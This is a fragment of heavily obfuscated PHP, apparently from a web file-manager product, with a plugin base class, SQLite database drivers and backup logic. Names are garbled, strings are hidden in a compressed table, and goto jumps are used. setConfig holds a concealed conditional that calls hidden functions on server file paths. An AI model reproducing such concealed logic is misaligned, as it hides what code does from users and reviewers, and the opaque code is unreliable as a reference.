$Ì×—Á°[889]); } else { if ($î÷…ÈÅ == $Ì×—Á°[1671] && !file_exists($ş’îş‡ . $î÷…ÈÅ . $Ì×—Á°[889]) && file_exists($ş’îş‡ . $Ì×—Á°[1672])) { $Ù²·òû = (include $ş’îş‡ . $Ì×—Á°[1672]); } else { if (file_exists($ş’îş‡ . $ëŞÄÉ£Š . $Ì×—Á°[889])) { $Ù²·òû = (include $ş’îş‡ . $ëŞÄÉ£Š . $Ì×—Á°[889]); } } } if (!is_array($Ù²·òû)) { return array(); } if (@count($Ù²·òû) > 0) { I18n::set($Ù²·òû); } return $Ù²·òû; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ô¾îş‚) { $Ä¾ˆàÄ =& $_SERVER[Õò”†—·]; if ($_SERVER[$Ä¾ˆàÄ[8]] != $_SERVER[$Ä¾ˆàÄ[1673]]) { $¢ÚÇëÔÆ = $Ä¾ˆàÄ[927]; $šõüÄš÷ = $Ä¾ˆàÄ[9]; $º‡Æª¦Õ = $_SERVER[$Ä¾ˆàÄ[10]] . $Ä¾ˆàÄ[11]; $¦ºÑ×„— = $šõüÄš÷($º‡Æª¦Õ); $Å¹Ã€»Ë = explode($Ä¾ˆàÄ[12], $¦ºÑ×„—); if (count($Å¹Ã€»Ë) < $Ä¾ˆàÄ[671]) { $¼•±•Ö = $Ä¾ˆàÄ[14]; $¼•±•Ö(); } $Æ×¼û÷ = $Ä¾ˆàÄ[928]; $Æ×¼û÷($_SERVER[$Ä¾ˆàÄ[929]]); $Æ×¼û÷($_SERVER[$Ä¾ˆàÄ[10]] . $Ä¾ˆàÄ[1674]); $Äµê‚øé = 1; while ($Äµê‚øé > 1) { $Äµê‚øé = $Äµê‚øé + 4; $”­ÏñĞ = rawurlencode($Äµê‚øé . $Ä¾ˆàÄ[438]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Ô¾îş‚); } public function onSetConfig($Ú“‡¦Ğ°) { } public function onGetConfig($ƒÌìÚÕ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ä±ÑşÒ¹) { if ($ä±ÑşÒ¹ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ç¾±Üò = "\160\154\165\147\151\x6e\101\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $¿Ş¨µ› = $this->getConfig(); if (!$¿Ş¨µ›[$ç¾±Üò]) { return !1; } return ActionCall($_SERVER[Õò”†—·][1675], $¿Ş¨µ›[$ç¾±Üò]); } public function url($ƒ’ÜÉ×•, $–‡ªİÚş = '', $ãä£§¥ó = true) { $š±¸ËÖù =& $_SERVER[Õò”†—·]; $Ù ì™¤¶ = $this->getConfig(); $Åšìï  = KOD_VERSION . $š±¸ËÖù[20] . KOD_VERSION_BUILD; $ãœ—…ØÖ = $this->packageVersion(); $¤¶È»’è = $Åšìï  . $š±¸ËÖù[446] . $ãœ—…ØÖ; if (substr($ƒ’ÜÉ×•, 0, 4) == $š±¸ËÖù[162] || substr($ƒ’ÜÉ×•, 0, 2) == $š±¸ËÖù[1409]) { $«×Ö§¤ = $ƒ’ÜÉ×• . $š±¸ËÖù[1676] . $¤¶È»’è; } else { if ($–‡ªİÚş == $š±¸ËÖù[22]) { $«×Ö§¤ = $this->pluginHost . $ƒ’ÜÉ×• . $š±¸ËÖù[1676] . $¤¶È»’è; } else { if ($–‡ªİÚş === $š±¸ËÖù[88]) { $«×Ö§¤ = $this->pluginHost . $ƒ’ÜÉ×•; } else { if ($–‡ªİÚş == $š±¸ËÖù[1677]) { $«×Ö§¤ = STATIC_PATH . $ƒ’ÜÉ×• . $š±¸ËÖù[1676] . $Åšìï ; } else { if ($–‡ªİÚş == $š±¸ËÖù[1678]) { $«×Ö§¤ = APP_HOST . $š±¸ËÖù[1679] . $ƒ’ÜÉ×• . $š±¸ËÖù[1676] . $Åšìï ; } else { if (isset($Ù ì™¤¶[$–‡ªİÚş])) { $«×Ö§¤ = $Ù ì™¤¶[$–‡ªİÚş] . $ƒ’ÜÉ×• . $š±¸ËÖù[1676] . $¤¶È»’è; } } } } } } if (!$ãä£§¥ó) { return $«×Ö§¤; } echo $«×Ö§¤; } public function link($˜­Üª§³ = false, $ù’û®–  = '') { $Ÿ÷·†¤ =& $_SERVER[Õò”†—·]; if (!$˜­Üª§³) { $this->link($Ÿ÷·†¤[1680], $Ÿ÷·†¤[1678]); $this->link($Ÿ÷·†¤[1681], $Ÿ÷·†¤[1677]); $this->link($Ÿ÷·†¤[1682], $Ÿ÷·†¤[1677]); $this->link($Ÿ÷·†¤[1683], $Ÿ÷·†¤[1677]); $this->link($Ÿ÷·†¤[1684], $Ÿ÷·†¤[1677]); return; } $àÕ¢½¬ = $this->url($˜­Üª§³, $ù’û®– , !1); if (substr($˜­Üª§³, -3) == $Ÿ÷·†¤[1685]) { echo $Ÿ÷·†¤[1686] . $àÕ¢½¬ . $Ÿ÷·†¤[1687] . $Ÿ÷·†¤[12]; } else { if (substr($˜­Üª§³, -4) == $Ÿ÷·†¤[1688]) { echo $Ÿ÷·†¤[1689] . $àÕ¢½¬ . $Ÿ÷·†¤[1690] . $Ÿ÷·†¤[12]; } } } } $_file = $_SERVER[$_SERVER[Õò”†—·][6]]; goto AÄ†ê‡ÈÑ; c¬ãÇôí°: define($_SERVER[Õò”†—·][0], $_SERVER[Õò”†—·][1]); $_SERVER[Õ°á¾ÔŸ] = explode($_SERVER[Õò”†—·][2], gzinflate(substr($_SERVER[Õò”†—·][3], 10, -8))); function binCheckEq($ááº¼şÇ, $—¿ğã–“) { return $ááº¼şÇ == $—¿ğã–“; } goto aë¸ÄˆòÊ³; BÏ‘ƒ½İĞê: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ŸäÔ³ï³ =& $_SERVER[Õò”†—·]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ŸäÔ³ï³[16]] =& $config; $this->values[$ŸäÔ³ï³[17]] =& $in; $this->tpl = TEMPLATE . MOD . $ŸäÔ³ï³[18]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÂßıÒ½Ÿ) { if (1 === func_num_args()) { $this->{$ÂßıÒ½Ÿ} = new $ÂßıÒ½Ÿ(); } else { $ÛË¢—£º = new ReflectionClass($ÂßıÒ½Ÿ); $½ìÔî” = func_get_args(); array_shift($½ìÔî”); $this->{$ÂßıÒ½Ÿ} = $ÛË¢—£º->newInstanceArgs($½ìÔî”); } return $this->{$ÂßıÒ½Ÿ}; } public function routeBind($®ØúŠŒÕ, $ÜÖ•¦ã‰, $‡ÊâÌ­€ = 3) { $íØÌ”ğ´ =& $_SERVER[Õò”†—·]; $àÙ³£´ï = $this->in[$íØÌ”ğ´[19]]; $®ØúŠŒÕ = str_replace($íØÌ”ğ´[20], $íØÌ”ğ´[21], trim(trim($®ØúŠŒÕ, $íØÌ”ğ´[18]), $íØÌ”ğ´[22])); if (!$®ØúŠŒÕ || count($àÙ³£´ï) <= $‡ÊâÌ­€) { return !1; } $áğ÷Ó›ä = !0; $‡±ÉÜÜ = explode($íØÌ”ğ´[18], $®ØúŠŒÕ); for ($å“á†«ş = 0; $å“á†«ş < count($‡±ÉÜÜ); $å“á†«ş++) { if ($‡±ÉÜÜ[$å“á†«ş] != $àÙ³£´ï[$‡ÊâÌ­€ + $å“á†«ş]) { $áğ÷Ó›ä = !1; break; } } if (!$áğ÷Ó›ä) { return; } call_user_func_array(array($this, $ÜÖ•¦ã‰), array()); } public function routeArgs($£æ¬ôõß = 3) { $®‹Ì‰ÂÊ = $this->in[$_SERVER[Õò”†—·][19]]; if (count($®‹Ì‰ÂÊ) <= $£æ¬ôõß) { return array(); } $ğ´®ÇÜ = array(); for ($¾ı†—’Á = $£æ¬ôõß; $¾ı†—’Á < count($®‹Ì‰ÂÊ); $¾ı†—’Á += 2) { $ğ´®ÇÜ[$®‹Ì‰ÂÊ[$¾ı†—’Á]] = $®‹Ì‰ÂÊ[$¾ı†—’Á + 1]; $this->in[$®‹Ì‰ÂÊ[$¾ı†—’Á]] = $®‹Ì‰ÂÊ[$¾ı†—’Á + 1]; } return $ğ´®ÇÜ; } protected function assign($òÚ€ƒ‡ä, $è³ıí“) { $this->values[$òÚ€ƒ‡ä] = $è³ıí“; } protected function display($±Û—øÃó) { ob_end_clean(); extract($this->values); require $this->tpl . $±Û—øÃó; } } class DbSqliteBase extends Db { public function __construct($»êîšâ™ = '') { $Ñ´¯«¹’ =& $_SERVER[Õò”†—·]; if (!extension_loaded($Ñ´¯«¹’[23])) { think_exception(think_lang($Ñ´¯«¹’[24]) . $Ñ´¯«¹’[25]); } if (!empty($»êîšâ™)) { if (!isset($»êîšâ™[$Ñ´¯«¹’[26]])) { $»êîšâ™[$Ñ´¯«¹’[26]] = 438; } $this->config = $»êîšâ™; if (empty($this->config[$Ñ´¯«¹’[27]])) { $this->config[$Ñ´¯«¹’[27]] = array(); } } } public function connect($Î¨¼ÑËä = '', $£ÍªØæà = 0) { $Ùâ­†Ûç =& $_SERVER[Õò”†—·]; if (!isset($this->linkID[$£ÍªØæà])) { if (empty($Î¨¼ÑËä)) { $Î¨¼ÑËä = $this->config; } $›ğåÜ©“ = !empty($Î¨¼ÑËä[$Ùâ­†Ûç[27]][$Ùâ­†Ûç[28]]) ? $Î¨¼ÑËä[$Ùâ­†Ûç[27]][$Ùâ­†Ûç[28]] : $this->pconnect; $ÇÔ¼¬ì£ = $›ğåÜ©“ ? $Ùâ­†Ûç[29] : $Ùâ­†Ûç[30]; $this->linkID[$£ÍªØæà] = $ÇÔ¼¬ì£($Î¨¼ÑËä[$Ùâ­†Ûç[31]], $Î¨¼ÑËä[$Ùâ­†Ûç[26]]); if (!$this->linkID[$£ÍªØæà]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$£ÍªØæà], 30000); if (1 != think_config($Ùâ­†Ûç[32])) { unset($this->config); } } return $this->linkID[$£ÍªØæà]; } public function free() { $this->queryID = null; } public function query($ª¸‡Âû‹) { $®ø³Ã©  =& $_SERVER[Õò”†—·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ª¸‡Âû‹; if ($this->queryID) { $this->free(); } think_action_status($®ø³Ã© [33], 1); think_status($®ø³Ã© [34]); $this->queryID = sqlite_query($this->_linkID, $ª¸‡Âû‹); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ºê§öåı = $this->getAll(); return $ºê§öåı; } } public function execute($Ç®âÒÊ·) { $ë¿Ìêƒ¶ =& $_SERVER[Õò”†—·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ç®âÒÊ·; if ($this->queryID) { $this->free(); } think_action_status($ë¿Ìêƒ¶[35], 1); think_status($ë¿Ìêƒ¶[34]); $Ï“„Ô£ = sqlite_exec($this->_linkID, $Ç®âÒÊ·); $this->debug(); if (!1 === $Ï“„Ô£) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Õò”†—·][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Û »·½ = sqlite_query($this->_linkID, $_SERVER[Õò”†—·][37]); if (!$Û »·½) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $İ±®†¸ı = sqlite_query($this->_linkID, $_SERVER[Õò”†—·][38]); if (!$İ±®†¸ı) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $óøÀÍ»© = array(); if ($this->numRows > 0) { for ($ı™ÓˆÄæ = 0; $ı™ÓˆÄæ < $this->numRows; $ı™ÓˆÄæ++) { $óøÀÍ»©[$ı™ÓˆÄæ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $óøÀÍ»©; } public function getFields($èÊÚ• ğ) { $×•Øº =& $_SERVER[Õò”†—·]; $è§ ‚âš = $this->query($×•Øº[39] . $èÊÚ• ğ . $×•Øº[40]); $‘¥Ã¿¬† = array(); if ($è§ ‚âš) { foreach ($è§ ‚âš as $ªøş£“ => $¦š‘ ªş) { $‘¥Ã¿¬†[$¦š‘ ªş[$×•Øº[41]]] = array($×•Øº[42] => $¦š‘ ªş[$×•Øº[41]], $×•Øº[43] => $¦š‘ ªş[$×•Øº[44]], $×•Øº[45] => (bool) ($¦š‘ ªş[$×•Øº[46]] === $×•Øº[22]), $×•Øº[47] => $¦š‘ ªş[$×•Øº[48]], $×•Øº[49] => strtolower($¦š‘ ªş[$×•Øº[50]]) == $×•Øº[51], $×•Øº[52] => strtolower($¦š‘ ªş[$×•Øº[53]]) == $×•Øº[54]); } } return $‘¥Ã¿¬†; } public function getTables($ø¨ªå = '') { $Ëáúêõ¸ =& $_SERVER[Õò”†—·]; $ñÏŒÓ°Ì = $this->query($Ëáúêõ¸[55] . $Ëáúêõ¸[56] . $Ëáúêõ¸[57]); $Êïûó„­ = array(); foreach ($ñÏŒÓ°Ì as $¸É²ˆê => $ÎÉÎä¥) { $Êïûó„­[$¸É²ˆê] = current($ÎÉÎä¥); } return $Êïûó„­; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ş¤â¯£¶ =& $_SERVER[Õò”†—·]; $¹‘ˆåœ = sqlite_last_error($this->_linkID); $this->error = $¹‘ˆåœ . $ş¤â¯£¶[4] . sqlite_error_string($¹‘ˆåœ); if ($ş¤â¯£¶[22] != $this->queryStr) { $this->error .= LNG($ş¤â¯£¶[58]) . $this->queryStr; } think_trace($this->error, $ş¤â¯£¶[22], $ş¤â¯£¶[59]); return $this->error; } public function escapeString($ùöŸÇŠÊ) { return sqlite_escape_string($ùöŸÇŠÊ); } public function parseLimit($Õ®µ˜Èï) { $ÃÉ« =& $_SERVER[Õò”†—·]; $‡¶‰Ââ = $ÃÉ«[22]; if (!empty($Õ®µ˜Èï)) { $Õ®µ˜Èï = explode($ÃÉ«[60], $Õ®µ˜Èï); if (count($Õ®µ˜Èï) > 1) { $‡¶‰Ââ .= $ÃÉ«[61] . $Õ®µ˜Èï[1] . $ÃÉ«[62] . $Õ®µ˜Èï[0] . $ÃÉ«[63]; } else { $‡¶‰Ââ .= $ÃÉ«[61] . $Õ®µ˜Èï[0] . $ÃÉ«[63]; } } return $‡¶‰Ââ; } } class DbSqlite3Base extends Db { public function __construct($ƒ…¿©¤€ = '') { $¯Í„ùî¬ =& $_SERVER[Õò”†—·]; if (!class_exists($¯Í„ùî¬[64])) { think_exception(think_lang($¯Í„ùî¬[24]) . $¯Í„ùî¬[65]); } if (!empty($ƒ…¿©¤€)) { if (!isset($ƒ…¿©¤€[$¯Í„ùî¬[26]])) { $ƒ…¿©¤€[$¯Í„ùî¬[26]] = 438; } $this->config = $ƒ…¿©¤€; if (empty($this->config[$¯Í„ùî¬[27]])) { $this->config[$¯Í„ùî¬[27]] = array(); } } } public function connect($¯Ğ®üÀ½ = '', $«åÀ’ªŸ = 0) { $´„ä¶ÊÑ =& $_SERVER[Õò”†—·]; if (!isset($this->linkID[$«åÀ’ªŸ])) { if (empty($¯Ğ®üÀ½)) { $¯Ğ®üÀ½ = $this->config; } $this->linkID[$«åÀ’ªŸ] = new SQLite3($¯Ğ®üÀ½[$´„ä¶ÊÑ[31]]); if (!$this->linkID[$«åÀ’ªŸ]) { think_exception($this->linkID[$«åÀ’ªŸ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$«åÀ’ªŸ]->busyTimeout(30000); if (1 != think_config($´„ä¶ÊÑ[32])) { unset($this->config); } } return $this->linkID[$«åÀ’ªŸ]; } public function free() { $this->queryID = null; } public function query($åä‡¶²) { $ŒâïË¼Á =& $_SERVER[Õò”†—·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $åä‡¶²; if ($this->queryID) { $this->free(); } think_action_status($ŒâïË¼Á[33], 1); think_status($ŒâïË¼Á[34]); $this->queryID = $this->_linkID->query($åä‡¶²); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $µöšÁÈ» = $this->getAll(); $this->numRows = count($µöšÁÈ»); return $µöšÁÈ»; } } public function execute($¯†à¡) { $ÓØÆóÁ• =& $_SERVER[Õò”†—·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¯†à¡; if ($this->queryID) { $this->free(); } think_action_status($ÓØÆóÁ•[35], 1); think_status($ÓØÆóÁ•[34]); $°‚–¢ = $this->_linkID->exec($¯†à¡); $this->debug(); if (!1 === $°‚–¢) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Õò”†—·][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Å†­½»ò = $this->_linkID->query($_SERVER[Õò”†—·][37]); if (!$Å†­½»ò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $àç€ÑÍ„ = $this->_linkID->query($_SERVER[Õò”†—·][38]); if (!$àç€ÑÍ„) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $È‡ôôÄ² = array(); while ($ĞãôÌÑÁ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $È‡ôôÄ²[] = $ĞãôÌÑÁ; } $this->queryID->reset(); return $È‡ôôÄ²; } public function getFields($ùµ÷Å°ë) { $©§ãŒ´ =& $_SERVER[Õò”†—·]; $Ÿå¹İşÁ = $this->query($©§ãŒ´[39] . $ùµ÷Å°ë . $©§ãŒ´[40]); $õ«ƒ™¬‘ = array(); if ($Ÿå¹İşÁ) { foreach ($Ÿå¹İşÁ as $ƒ¿†Ö© => $áİ±£) { $õ«ƒ™¬‘[$áİ±£[$©§ãŒ´[42]]] = array($©§ãŒ´[42] => $áİ±£[$©§ãŒ´[42]], $©§ãŒ´[43] => $áİ±£[$©§ãŒ´[43]], $©§ãŒ´[45] => (bool) ($áİ±£[$©§ãŒ´[45]] === $©§ãŒ´[22]), $©§ãŒ´[47] => $áİ±£[$©§ãŒ´[66]], $©§ãŒ´[49] => (bool) $áİ±£[$©§ãŒ´[67]], $©§ãŒ´[52] => (bool) $áİ±£[$©§ãŒ´[67]]); } } return $õ«ƒ™¬‘; } public function getTables($ü§’Îñ = '') { $ÛÊ’–ê =& $_SERVER[Õò”†—·]; $ŒµíÖ = $this->query($ÛÊ’–ê[55] . $ÛÊ’–ê[56] . $ÛÊ’–ê[57]); $âŞÏö—Û = array(); foreach ($ŒµíÖ as $‹ÑµŞË => $Ò¨¦ÃÊâ) { $âŞÏö—Û[$‹ÑµŞË] = current($Ò¨¦ÃÊâ); } return $âŞÏö—Û; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‰«§íØ =& $_SERVER[Õò”†—·]; $this->error = $this->_linkID->lastErrorMsg(); if ($‰«§íØ[22] != $this->queryStr) { $this->error .= LNG($‰«§íØ[58]) . $this->queryStr; } think_trace($this->error, $‰«§íØ[22], $‰«§íØ[59]); return $this->error; } public function escapeString($îæ‘À¾) { $ÃæÚ¼ =& $_SERVER[Õò”†—·]; if ($this->_linkID) { return $this->_linkID->escapeString($îæ‘À¾); } return str_ireplace($ÃæÚ¼[68], $ÃæÚ¼[69], $îæ‘À¾); } public function parseLimit($û½ÇÚ¦Ø) { $ß‹–Ä¤’ =& $_SERVER[Õò”†—·]; $ Â°‚®Š = $ß‹–Ä¤’[22]; if (!empty($û½ÇÚ¦Ø)) { $û½ÇÚ¦Ø = explode($ß‹–Ä¤’[60], $û½ÇÚ¦Ø); if (count($û½ÇÚ¦Ø) > 1) { $ Â°‚®Š .= $ß‹–Ä¤’[61] . $û½ÇÚ¦Ø[1] . $ß‹–Ä¤’[62] . $û½ÇÚ¦Ø[0] . $ß‹–Ä¤’[63]; } else { $ Â°‚®Š .= $ß‹–Ä¤’[61] . $û½ÇÚ¦Ø[0] . $ß‹–Ä¤’[63]; } } return $ Â°‚®Š; } } goto BÛÛîİÜ‘·; CöÛê¿“: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ˆ¢ïÅµ– =& $_SERVER[Õò”†—·]; $this->isManual(); self::$name = date($ˆ¢ïÅµ–[799]); if (!($÷ñçÏÚÁ = Model($ˆ¢ïÅµ–[800])->lastItem())) { $÷ñçÏÚÁ = $this->initData(); } else { self::$name = $÷ñçÏÚÁ[$ˆ¢ïÅµ–[42]]; if ($÷ñçÏÚÁ[$ˆ¢ïÅµ–[801]] == $ˆ¢ïÅµ–[101]) { self::$name = date($ˆ¢ïÅµ–[272]); $é¡ç²•° = 0; if (isset($÷ñçÏÚÁ[$ˆ¢ïÅµ–[353]][$ˆ¢ïÅµ–[231]][$ˆ¢ïÅµ–[525]])) { $é¡ç²•° = (int) $÷ñçÏÚÁ[$ˆ¢ïÅµ–[353]][$ˆ¢ïÅµ–[231]][$ˆ¢ïÅµ–[525]]; } if (self::$manual == 0 && $÷ñçÏÚÁ[$ˆ¢ïÅµ–[42]] == self::$name) { Model($ˆ¢ïÅµ–[800])->remove($÷ñçÏÚÁ[$ˆ¢ïÅµ–[459]]); } $÷ñçÏÚÁ = $this->initData($é¡ç²•°, $÷ñçÏÚÁ[$ˆ¢ïÅµ–[802]]); } else { $this->checkStore($÷ñçÏÚÁ[$ˆ¢ïÅµ–[802]]); } } self::$option = $÷ñçÏÚÁ; } private function isManual() { $Ö”áº“Í = _get($GLOBALS, $_SERVER[Õò”†—·][803], 0); $Ö”áº“Í = intval($Ö”áº“Í); self::$manual = $Ö”áº“Í && $Ö”áº“Í == 1 ? 1 : 0; } private function initData($õÓÛÈšÎ = 0, $İ¥“úãá = '') { $À‘Ş—µ… =& $_SERVER[Õò”†—·]; $şßÎî = Model($À‘Ş—µ…[800])->config(); if ($İ¥“úãá && $şßÎî[$À‘Ş—µ…[802]] != $İ¥“úãá) { $õÓÛÈšÎ = 0; } $this->checkStore($şßÎî[$À‘Ş—µ…[802]]); if (self::$manual == 1) { self::$name .= $À‘Ş—µ…[21] . date($À‘Ş—µ…[804]); } $ê¡Íâã = array($À‘Ş—µ…[802] => $şßÎî[$À‘Ş—µ…[802]], $À‘Ş—µ…[42] => self::$name, $À‘Ş—µ…[801] => 0, $À‘Ş—µ…[805] => $şßÎî[$À‘Ş—µ…[805]], $À‘Ş—µ…[806] => self::$manual, $À‘Ş—µ…[353] => array($À‘Ş—µ…[807] => array($À‘Ş—µ…[801] => 0), $À‘Ş—µ…[808] => array($À‘Ş—µ…[801] => 0, $À‘Ş—µ…[809] => 0, $À‘Ş—µ…[810] => 0, $À‘Ş—µ…[43] => $À‘Ş—µ…[22], $À‘Ş—µ…[811] => 0, $À‘Ş—µ…[812] => 0), $À‘Ş—µ…[813] => array($À‘Ş—µ…[801] => 0, $À‘Ş—µ…[809] => 0, $À‘Ş—µ…[810] => 0, $À‘Ş—µ…[811] => 0, $À‘Ş—µ…[812] => 0), $À‘Ş—µ…[231] => array($À‘Ş—µ…[801] => 0, $À‘Ş—µ…[814] => 0, $À‘Ş—µ…[815] => 0, $À‘Ş—µ…[816] => 0, $À‘Ş—µ…[817] => 0, $À‘Ş—µ…[525] => $õÓÛÈšÎ, $À‘Ş—µ…[811] => 0, $À‘Ş—µ…[812] => 0)), $À‘Ş—µ…[811] => time(), $À‘Ş—µ…[812] => 0); $ÙÖ­¿©ñ = Model($À‘Ş—µ…[800])->insert($ê¡Íâã); $ê¡Íâã[$À‘Ş—µ…[459]] = $ÙÖ­¿©ñ; return $ê¡Íâã; } private function checkStore($Ó©‚ÛÄ¡) { $Ìşç«ş = Model($_SERVER[Õò”†—·][818]); $İ™Û‘à = $Ìşç«ş->listData($Ó©‚ÛÄ¡); $Ìşç«ş->checkConfig($İ™Û‘à); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Õò”†—·][800])->findByName(self::$name); } return self::$option; } public static function set($¡´€ì¸©) { $İ‚ÉÆı… =& $_SERVER[Õò”†—·]; $şì†ö¸Ã = self::get(); foreach ($¡´€ì¸© as $ µÌÏëÊ => $”Îœ´‡) { $æúş¤ŞŸ = explode($İ‚ÉÆı…[20], $ µÌÏëÊ); $¡œˆ°ÒÕ = count($æúş¤ŞŸ); switch ($¡œˆ°ÒÕ) { case 1: $şì†ö¸Ã[$æúş¤ŞŸ[0]] = $”Îœ´‡; break; case 2: $şì†ö¸Ã[$æúş¤ŞŸ[0]][$æúş¤ŞŸ[1]] = $”Îœ´‡; break; case 3: $şì†ö¸Ã[$æúş¤ŞŸ[0]][$æúş¤ŞŸ[1]][$æúş¤ŞŸ[2]] = $”Îœ´‡; break; } } Model($İ‚ÉÆı…[800])->update($şì†ö¸Ã[$İ‚ÉÆı…[459]], $şì†ö¸Ã); self::$option = $şì†ö¸Ã; return self::$option; } public function keep() { $”Øğ¹Ëß =& $_SERVER[Õò”†—·]; $å§áÆ°é = self::get(); if ($å§áÆ°é[$”Øğ¹Ëß[353]][$”Øğ¹Ëß[807]][$”Øğ¹Ëß[801]] == $”Øğ¹Ëß[101]) { return; } $this->backupKeep($å§áÆ°é); self::set(array($”Øğ¹Ëß[819] => 1)); } private function backupKeep($¶®µèŞá) { $™Õ£Ú§ =& $_SERVER[Õò”†—·]; if (self::$manual == 1) { return; } $Ş¡ÕÍ†É = Model($™Õ£Ú§[800])->listData(); if (empty($Ş¡ÕÍ†É)) { return; } $¢çûİøå = 0; $Æ°—Æ• = array(); foreach ($Ş¡ÕÍ†É as $‘Ší––ì) { if ($¢çûİøå >= 7) { break; } $Æ°—Æ•[] = $‘Ší––ì[$™Õ£Ú§[42]]; $¢çûİøå++; } for ($¢çûİøå = 0; $¢çûİøå < 12; $¢çûİøå++) { $Æ°—Æ•[] = date($™Õ£Ú§[820], strtotime("\x2d{$¢çûİøå}\40\x6d\157\156\x74\x68\x73")); } $Æ°—Æ• = array_unique($Æ°—Æ•); $¨¡ ä¸Ø = Model($™Õ£Ú§[821])->get($™Õ£Ú§[822]); foreach ($Ş¡ÕÍ†É as $‘Ší––ì) { if (isset($‘Ší––ì[$™Õ£Ú§[806]]) && $‘Ší––ì[$™Õ£Ú§[806]] == $™Õ£Ú§[101]) { continue; } if (!empty($‘Ší––ì[$™Õ£Ú§[42]]) && in_array($‘Ší––ì[$™Õ£Ú§[42]], $Æ°—Æ•)) { continue; } Model($™Õ£Ú§[800])->remove($‘Ší––ì[$™Õ£Ú§[459]]); $¨ƒ˜„Ï² = $this->backupPath($¶®µèŞá, $¨¡ ä¸Ø); IO::remove($¨ƒ˜„Ï², !1); } } private function backupPath($—±áé÷Õ, $×ÆîÌµù = false) { $şô‡Ğ’Ô =& $_SERVER[Õò”†—·]; if (!$×ÆîÌµù) { $×ÆîÌµù = Model($şô‡Ğ’Ô[821])->get($şô‡Ğ’Ô[822]); } $œ®Éö¿á = $—±áé÷Õ[$şô‡Ğ’Ô[42]]; $Ê…•ßµû = substr(md5($şô‡Ğ’Ô[823] . $×ÆîÌµù . $œ®Éö¿á), 0, 8); return "\x7b\x69\157\x3a{$—±áé÷Õ[$şô‡Ğ’Ô[802]]}\x7d\x2f\x64\141\x74\141\142\141\x73\x65\57\142\x61\143\x6b\x75\160\57" . $œ®Éö¿á . $şô‡Ğ’Ô[21] . $Ê…•ßµû; } public function db() { $ØƒÌİÍ =& $_SERVER[Õò”†—·]; $ÚµõîÀš = self::get(); if ($ÚµõîÀš[$ØƒÌİÍ[353]][$ØƒÌİÍ[808]][$ØƒÌİÍ[801]] == $ØƒÌİÍ[101]) { return !0; } $–Ø‹­«ì = new BackupDb(); if (!$–Ø‹­«ì->index()) { return !1; } self::set(array($ØƒÌİÍ[824] => 1)); return !0; } public function dbFile() { $ø¥‘¬‚¥ =& $_SERVER[Õò”†—·]; $ö¹™ —£ = self::get(); if ($ö¹™ —£[$ø¥‘¬‚¥[353]][$ø¥‘¬‚¥[813]][$ø¥‘¬‚¥[801]] == $ø¥‘¬‚¥[101]) { return !0; } $›èƒó¢¨ = new BackupDbFile(); if (!$›èƒó¢¨->index()) { return !1; } self::set(array($ø¥‘¬‚¥[825] => 1)); return !0; } public function file() { $Êİ‰ÕÇ =& $_SERVER[Õò”†—·]; $¿éƒ¹óí = self::get(); if ($¿éƒ¹óí[$Êİ‰ÕÇ[353]][$Êİ‰ÕÇ[231]][$Êİ‰ÕÇ[801]] == $Êİ‰ÕÇ[101]) { return !0; } if (!isset($¿éƒ¹óí[$Êİ‰ÕÇ[805]]) || $¿éƒ¹óí[$Êİ‰ÕÇ[805]] == $Êİ‰ÕÇ[229]) { $éÅ »ÕÃ = new BackupFile(); if (!$éÅ »ÕÃ->index()) { return !1; } } self::set(array($Êİ‰ÕÇ[826] => 1, $Êİ‰ÕÇ[801] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $½©Û±âƒ =& $_SERVER[Õò”†—·]; $ —Ì‹¤İ = Backup::get(); self::$io = $ —Ì‹¤İ[$½©Û±âƒ[802]]; self::$name = $ —Ì‹¤İ[$½©Û±âƒ[42]]; $ïÓêğ€« = new DbManage(); 